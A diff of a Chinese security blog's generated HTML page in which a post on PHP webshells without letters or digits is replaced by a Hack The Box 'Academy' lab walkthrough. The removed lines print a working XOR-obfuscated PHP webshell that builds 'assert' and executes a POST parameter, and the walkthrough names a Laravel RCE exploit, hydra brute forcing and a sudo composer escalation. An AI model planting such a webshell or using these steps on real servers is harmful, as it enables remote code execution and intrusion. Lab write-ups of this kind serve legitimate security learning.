@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>No character shell study | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="No character shell study | 九世的博客">
+  <title>Hack the box Academy | 九世的博客</title>
+  <meta name="keywords" content=" htb ">
+  <meta name="description" content="Hack the box Academy | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1633,9 +1633,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-No-character-shell-study" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-Hack-the-box-Academy" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">No character shell study</h1>
+        <h1 class="article-title">Hack the box Academy</h1>
     
     <div class="article-meta">
         
@@ -1644,14 +1644,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color4">htb</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-01-18 13:36</time>
+        创建时间:<time class="date" title="更新时间: 2021-02-20 01:41:49">2021-02-20 01:10</time>
         
     </div>
     <div class="article-meta">
@@ -1673,7 +1673,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#入口点立足"><span class="toc-text">入口点立足</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获取用户权限"><span class="toc-text">获取用户权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#权限提升"><span class="toc-text">权限提升</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1688,43 +1688,27 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇博文是看了<a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener">无字母数字Webshell之提高篇 - FreeBuf互联网安全新媒体平台</a>，进行了一定的研究然后对异或进行了研究，从一开始的懵懵逼逼到后面的总结。<br><img src="https://truth.bahamut.com.tw/s01/201711/408f46a15ffa133d0a5e418dfb2d0b2e.JPG" alt="408f46a15ffa133d0a5e418dfb2d0b2e.JPG"></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先说说什么的异或吧，比如说：</p>
-<pre><code>&lt;?php
-    echo &quot;A&quot;^&quot;?&quot;;
-?&gt;
-</code></pre><p>结果是~，为什么是 ~（懵逼）</p>
-<pre><code>异或过程:
-先将异或的两个字符串转换为ASCII码
-A的ASCII:65
-?的ASCII:63
-
-寻找对应的二进制:
-ASCII码65的二进制为:0100 0001
-ASCII嘛63的二进制位:0011 1111
-
-异或过程，1碰0位1,0碰1为1，其他为0
-0100 0001
-0011 1111
-0111 1110
-
-结果为:01111110
-
-寻找对应的ASCII码:
-对应的ASCII码为:126
-对应的字符串为:~
-
-然后我们就得到了异或的整一个过程:
-字符串-&gt;ASCII-&gt;二进制-&gt;二进制异或的结果-&gt;ASCII码-&gt;字符串
-</code></pre><p>然后实现一个马子 ：</p>
-<pre><code>&lt;?php
-$_0=(&quot;!&quot;^&quot;@&quot;).(&quot;3&quot;^&quot;@&quot;).(&quot;3&quot;^&quot;@&quot;).(&quot;%&quot;^&quot;@&quot;).(&quot;2&quot;^&quot;@&quot;).(&quot;4&quot;^&quot;@&quot;); /*assert*/
-$_1=&#39;_&#39;.(hex2bin(&quot;10&quot;)^&quot;@&quot;).(hex2bin(&quot;0F&quot;)^&quot;@&quot;).(hex2bin(&quot;13&quot;)^&quot;@&quot;).(hex2bin(&quot;14&quot;)^&quot;@&quot;);
-$_2=$$_1;
-$_0($_2[_]);
-?&gt;
-</code></pre><p><img src="https://s2.ax1x.com/2019/01/18/k9uds0.png" alt="k9uds0.png"></p>
-<p>转载请声明：转自422926799.github.io</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>没事干和队友打htb</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap</p>
+<pre><code>portscan:
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>whatweb获取web信息的时候发现跳转到<code>http://academy.htb/</code>的域失败了，/etc/hosts加了上去</p>
+<pre><code>http://academy.htb/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.215], Title[Hack The Box Academy]
+</code></pre><p>常规的路径扫描<br><img src="https://s3.ax1x.com/2021/02/20/y4N0nU.png" alt=""></p>
+<h2 id="入口点立足"><a href="#入口点立足" class="headerlink" title="入口点立足"></a>入口点立足</h2><p>打开web发现可以注册和登录，注册可以注册admin用户<br><img src="https://s3.ax1x.com/2021/02/20/y4NBBF.png" alt=""></p>
+<p>到后台登录队友说是弱口令登录，but我就是tm不行。后面找其要来cookie登上，发现提示<code>dev-staging-01.academy.htb</code>,添加到hosts<br>访问发现是laravel<br><img src="https://s3.ax1x.com/2021/02/20/y4NsAJ.png" alt=""></p>
+<p>由于开启了debug，得到API_KEY<br><img src="https://s3.ax1x.com/2021/02/20/y4N21x.png" alt=""></p>
+<p>搜索laravel RCE发现一个CVE-2018-15133<br>exp：<a href="https://github.com/aljavier/exploit_laravel_cve-2018-15133" target="_blank" rel="noopener">https://github.com/aljavier/exploit_laravel_cve-2018-15133</a><br>利用该CVE获得shell<br><img src="https://s3.ax1x.com/2021/02/20/y4N5He.png" alt=""></p>
+<h2 id="获取用户权限"><a href="#获取用户权限" class="headerlink" title="获取用户权限"></a>获取用户权限</h2><p><code>ls -al /home/*</code>确定要攻击的目标用户<br>（带有user.txt的才是最终用户）<br><img src="https://s3.ax1x.com/2021/02/20/y4USEQ.png" alt=""></p>
+<p>在web目录瞎翻，翻到两个数据库凭证<br><img src="https://s3.ax1x.com/2021/02/20/y4NoAH.png" alt=""></p>
+<p><img src="https://s3.ax1x.com/2021/02/20/y4Nju8.png" alt=""></p>
+<p>手机/home/目录下的用户，使用hydra爆破得到用户<br><img src="https://s3.ax1x.com/2021/02/20/y4UPCn.png" alt=""></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>拿完user.txt后，经过一个小时后使用linPEAss脚本进行信息收集，发现有个su的用户提权的密码<br><img src="https://s3.ax1x.com/2021/02/20/y4Ui3q.png" alt=""></p>
+<p>登录后尝试sudo -l发现拥有sudo权限<br><img src="https://s3.ax1x.com/2021/02/20/y4UEuT.png" alt=""></p>
+<p>GTFObins搜索到对应的提权方法<br><a href="https://gtfobins.github.io/gtfobins/composer/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/composer/</a></p>
+<p>提权成功<br><img src="https://s3.ax1x.com/2021/02/20/y4UZbF.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1734,12 +1718,12 @@ $_0($_2[_]);
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>No character shell study</p>
+    <p><span class="copy-title">文章标题:</span>Hack the box Academy</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-01-18, 13:36:12</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/390d804c.html" title="No character shell study">http://422926799.github.io/posts/390d804c.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-02-20, 01:10:30</p>
+    <p><span class="copy-title">最后更新:</span>2021-02-20, 01:41:49</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/ae09ddc5.html" title="Hack the box Academy">http://422926799.github.io/posts/ae09ddc5.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
